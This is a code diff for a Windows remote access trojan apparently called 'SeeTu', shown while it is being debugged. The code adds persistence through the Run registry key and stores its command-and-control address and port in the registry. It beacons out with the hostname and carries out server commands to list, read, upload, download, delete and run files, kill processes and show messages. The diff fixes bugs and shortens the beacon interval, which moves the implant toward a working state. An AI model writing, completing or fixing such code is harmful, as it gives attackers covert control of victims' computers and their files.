@@ -20,13 +20,53 @@ union u_commands{
   char message[255];
 };
 
+int get_configs(struct s_configs *configs){
+  HKEY hkey;
+  ULONGLONG reg_config;
+  DWORD size = sizeof(reg_config);
+  RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_QUERY_VALUE, &hkey);
+  RegGetValueA(hkey, "SeeTu\\Settings", "configs", RRF_RT_REG_QWORD, NULL, &reg_config, &size);
+  configs->out_addr = ((reg_config & 0xFFFFFFFF00000000) >> 32);
+  configs->out_port = ((reg_config & 0xFFFF0000) >> 16);
+  configs->sleep_hour = ((reg_config & 0xFF00) >> 8);
+  configs->sleep_mins = (reg_config & 0xFF);
+  RegCloseKey(hkey);
+  return 0;
+}
+
+int setup(struct s_configs *configs){
+  char filepath[255];
+  char autocommand[255];
+  HKEY hkey;
+  ULONGLONG reg_config;
+  GetModuleFileNameA(NULL, filepath, sizeof(filepath));
+  snprintf(autocommand, sizeof(autocommand), "%s -- autostart", filepath);
+  RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey);
+  RegSetValueExA(hkey, "SeeTu", 0, REG_SZ, autocommand, sizeof(autocommand));
+  RegCloseKey(hkey);
+  reg_config += configs->out_addr * 0x100000000;
+  reg_config += configs->out_port * 0x10000;
+  reg_config += configs->sleep_hour * 0x100;
+  reg_config += configs->sleep_mins;
+  RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_CREATE_SUB_KEY, &hkey);
+  RegCreateKeyExA(hkey, "SeeTu\\Settings", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL);
+  RegSetValueExA(hkey, "configs", 0, REG_QWORD, (const BYTE*)&reg_config, sizeof(reg_config));
+  RegCloseKey(hkey);
+  return 0;
+}
+
+int reply(uint16_t command, char *data, int datasize){
+
+  return 0;
+}
+
 int change_configs(union u_commands *u, struct s_configs *configs){
-  memcpy(configs->out_addr, u->change_configs[0], 4);
-  memcpy(configs->out_port, u->change_configs[4], 2);
-  memcpy(configs->sleep_hour, u->change_configs[7], 1);
-  memcpy(configs->sleep_hour, u->change_configs[8], 1);
+  memcpy(&configs->out_addr, &u->change_configs[0], 4);
+  memcpy(&configs->out_port, &u->change_configs[4], 2);
+  memcpy(&configs->sleep_hour, &u->change_configs[7], 1);
+  memcpy(&configs->sleep_hour, &u->change_configs[8], 1);
   setup(configs);
-  reply(0x01, NULL, NULL);
+  reply(0x01, NULL, 0);
   return 0;
 }
 
@@ -133,7 +173,7 @@ int openconn(struct s_configs* configs){
 int beacon(int sockfd, struct s_configs *configs){
   int host_len = 0;
   char buff[255] = {0};
-  if(GetHostName(buff, sizeof(buff)) != 0){
+  if(gethostname(buff, sizeof(buff)) != 0){
     return -1;
   }
   for(int i = 0; i < sizeof(buff); i++){
@@ -170,54 +210,54 @@ int command(int sockfd, struct s_configs *configs){
   uint8_t vardata = 0;
   uint16_t commands = (buff[3] * 0x100) + buff[4];
   if(commands == 0){
-    reply(0, NULL, NULL);
+    reply(0, NULL, 0);
     return 0;   
   }
   else if(commands & 0x01 == 0x01){
     memset(&u, 0, sizeof(u));
-    memcpy(&u.change_configs, buff[offset], 8);
+    memcpy(&u.change_configs, &buff[offset], 8);
     change_configs(&u, configs);
     offset += 8;
   }
   else if(commands & 0x02 == 0x02){
     vardata = buff[offset];
     memset(&u, 0, sizeof(u));
-    memcpy(&u.filepath, buff[offset + 1], vardata);
-    ls_file(&u.filepath);
+    memcpy(&u.filepath, &buff[offset + 1], vardata);
+    ls_file(&u);
     offset += vardata;
   }
   else if(commands & 0x04 == 0x04){
     vardata = buff[offset];
     memset(&u, 0, sizeof(u));
-    memcpy(&u.filepath, buff[offset + 1], vardata);
-    cat_file(&u.filepath);
+    memcpy(&u.filepath, &buff[offset + 1], vardata);
+    cat_file(&u);
     offset += vardata;
   }
   else if(commands & 0x08 == 0x08){
     vardata = buff[offset];
     memset(&u, 0, sizeof(u));
-    memcpy(&u.filepath, buff[offset + 1], vardata);
-    send_file(&u.filepath);
+    memcpy(&u.filepath, &buff[offset + 1], vardata);
+    send_file(&u);
     offset += vardata;
   }
   else if(commands & 0x10 == 0x10){
     memset(&u, 0, sizeof(u));
-    memcpy(&u.recv_file, buff[offset], 6);
-    recv_file(&u.recv_file);
+    memcpy(&u.recv_file, &buff[offset], 6);
+    recv_file(&u);
     offset += 6;
   }
   else if(commands & 0x20 == 0x20){
     vardata = buff[offset];
     memset(&u, 0, sizeof(u));
-    memcpy(&u.filepath, buff[offset + 1], vardata);
-    delete(&u.filepath);
+    memcpy(&u.filepath, &buff[offset + 1], vardata);
+    delete_file(&u);
     offset += vardata;
   }
   else if(commands & 0x40 == 0x40){
     vardata = buff[offset];
     memset(&u, 0, sizeof(u));
-    memcpy(&u.filepath, buff[offset + 1], vardata);
-    run_file(&u.filepath);
+    memcpy(&u.filepath, &buff[offset + 1], vardata);
+    run_file(&u);
     offset += vardata;
   }
   else if(commands & 0x80 == 0x80){
@@ -225,8 +265,8 @@ int command(int sockfd, struct s_configs *configs){
   }
   else if(commands & 0x100 == 0x100){
     memset(&u, 0, sizeof(u));
-    memcpy(&u.kill_process, buff[offset], 8);
-    kill_process(&u.kill_process);
+    memcpy(&u.kill_process, &buff[offset], 8);
+    kill_process(&u);
     offset += 8;
   }
   else if(commands & 0x200 == 0x200){
@@ -241,8 +281,8 @@ int command(int sockfd, struct s_configs *configs){
   else if(commands & 0x1000 == 0x1000){
     vardata = buff[offset];
     memset(&u, 0, sizeof(u));
-    memcpy(&u.message, buff[offset + 1], vardata);
-    display_message(&u.message);
+    memcpy(&u.message, &buff[offset + 1], vardata);
+    display_message(&u);
     offset += vardata;
   }
   else if(commands & 0x2000 == 0x2000){
@@ -257,11 +297,6 @@ int command(int sockfd, struct s_configs *configs){
   return 0;
 }
 
-int reply(uint16_t command, char* data, int datasize){
-
-  return 0;
-}
-
 int naptime(struct s_configs *configs){
   for(int i = 0; i < configs->sleep_hour; i++){
     Sleep(3600000);
@@ -271,41 +306,6 @@ int naptime(struct s_configs *configs){
   }
 }
 
-int get_configs(struct s_configs *configs){
-  HKEY hkey;
-  ULONGLONG reg_config;
-  LPDWORD size = sizeof(reg_config);
-  RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_QUERY_VALUE, &hkey);
-  RegGetValueA(hkey, "SeeTu\\Settings", "configs", RRF_RT_REG_QWORD, NULL, &reg_config, &size);
-  configs->out_addr = ((reg_config & 0xFFFFFFFF00000000) >> 32);
-  configs->out_port = ((reg_config & 0xFFFF0000) >> 16);
-  configs->sleep_hour = ((reg_config & 0xFF00) >> 8);
-  configs->sleep_mins = (reg_config & 0xFF);
-  RegCloseKey(hkey);
-  return 0;
-}
-
-int setup(struct s_configs *configs){
-  char filepath[255];
-  char autocommand[255];
-  HKEY hkey;
-  ULONGLONG reg_config;
-  GetModuleFileNameA(NULL, filepath, sizeof(filepath));
-  snprintf(autocommand, sizeof(autocommand), "%s -- autostart", filepath);
-  RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey);
-  RegSetValueExA(hkey, "SeeTu", 0, REG_SZ, autocommand, sizeof(autocommand));
-  RegCloseKey(hkey);
-  reg_config += configs->out_addr * 0x100000000;
-  reg_config += configs->out_port * 0x10000;
-  reg_config += configs->sleep_hour * 0x100;
-  reg_config += configs->sleep_mins;
-  RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_CREATE_SUB_KEY, &hkey);
-  RegCreateKeyExA(hkey, "SeeTu\\Settings", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL);
-  RegSetValueExA(hkey, "configs", 0, REG_QWORD, (const BYTE*)&reg_config, sizeof(reg_config));
-  RegCloseKey(hkey);
-  return 0;
-}
-
 int main(int argc, char *argv[]){
   //wake up daddys home
   struct s_configs configs;
@@ -313,8 +313,8 @@ int main(int argc, char *argv[]){
   //[START CONFIGS]
   configs.out_addr = 0x0100007f;//127.0.0.1 --0100007f901f010f
   configs.out_port = 0x901f;//8080
-  configs.sleep_hour = 1;
-  configs.sleep_mins = 15;
+  configs.sleep_hour = 0;
+  configs.sleep_mins = 1;
   //[END CONFIGS]
 
   if(argc < 1 && strncmp(argv[1], "--autostart", 11) == 0){
